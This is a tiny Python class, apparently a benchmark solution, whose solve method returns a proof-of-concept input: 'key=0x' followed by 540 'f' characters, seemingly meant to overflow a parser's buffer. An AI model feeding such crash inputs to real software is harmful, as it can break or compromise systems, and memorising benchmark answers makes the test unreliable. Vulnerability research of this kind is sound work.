class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b"key=0x"
        hex_payload = b"f" * 540
        return header + hex_payload